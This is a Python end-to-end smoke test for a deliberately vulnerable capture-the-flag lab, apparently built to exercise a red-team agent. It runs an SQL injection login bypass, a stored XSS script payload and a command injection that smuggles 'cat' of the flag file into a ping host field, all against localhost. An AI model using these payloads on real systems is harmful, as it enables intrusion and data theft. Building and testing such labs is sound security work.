#!/usr/bin/env python
"""Standalone end-to-end smoke test for the War Zone lab.

Boots the target app against throwaway storage, exercises all three bugs over
HTTP exactly as the red-team agent would, and confirms each one yields the
live flag. Runs without Docker so it can gate CI or a local change.
"""
from __future__ import annotations

import os
import re
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import requests

ROOT = Path(__file__).resolve().parents[1]
TARGET_DIR = ROOT / "services" / "target_app"
BASE = "http://127.0.0.1:5000"
FLAG_RE = re.compile(r"WARZONE\{[0-9a-f]+\}")


def _wait_for_health(deadline: float) -> None:
    while time.time() < deadline:
        try:
            if requests.get(f"{BASE}/healthz", timeout=1).status_code == 200:
                return
        except requests.RequestException:
            time.sleep(0.3)
    raise RuntimeError("target did not become healthy in time")


def _sqli_flag() -> str:
    resp = requests.post(
        f"{BASE}/api/v1/auth/login",
        json={"username": "admin' -- ", "password": "x"},
        timeout=5,
    )
    return resp.json()["flag"]


def _xss_flag() -> str:
    requests.post(
        f"{BASE}/api/v1/comments",
        json={"author": "mallory", "body": "<script>warzone-steal</script>"},
        timeout=5,
    )
    for _ in range(10):
        comments = requests.get(f"{BASE}/api/v1/comments", timeout=5).json()["comments"]
        for c in comments:
            if c["author"] == "admin-bot":
                match = FLAG_RE.search(c["body"])
                if match:
                    return match.group(0)
        time.sleep(1)
    raise RuntimeError("admin-bot never leaked the XSS flag")


def _cmdi_flag(flag_path: Path) -> str:
    resp = requests.post(
        f"{BASE}/api/v1/diagnostics/ping",
        json={"host": f"127.0.0.1; cat {flag_path}"},
        timeout=5,
    )
    match = FLAG_RE.search(resp.json()["output"])
    if not match:
        raise RuntimeError("command injection did not return a flag")
    return match.group(0)


def main() -> int:
    tmp = Path(tempfile.mkdtemp(prefix="warzone-e2e-"))
    env = {
        **os.environ,
        "DB_PATH": str(tmp / "target.db"),
        "FLAG_DIR": str(tmp / "flags"),
        "APP_LOG": str(tmp / "app.log"),
        "STATE_DIR": str(tmp / "state"),
        "FLAG_ROTATE_SECONDS": "3600",
        "DASHBOARD_URL": "http://localhost:9",
        "LISTEN_HOST": "127.0.0.1",
    }
    proc = subprocess.Popen(
        [sys.executable, "-m", "src.app"],
        cwd=TARGET_DIR,
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    try:
        _wait_for_health(time.time() + 15)
        live = (tmp / "flags" / "flag_current.txt").read_text().strip()

        checks = {
            "sqli": _sqli_flag(),
            "xss": _xss_flag(),
            "cmdi": _cmdi_flag(tmp / "flags" / "flag_current.txt"),
        }
        for vector, flag in checks.items():
            assert flag == live, f"{vector}: got {flag!r}, expected {live!r}"
            print(f"  [{vector}] recovered live flag {flag}")
        print("e2e smoke: all three vectors recovered the live flag")
        return 0
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    sys.exit(main())
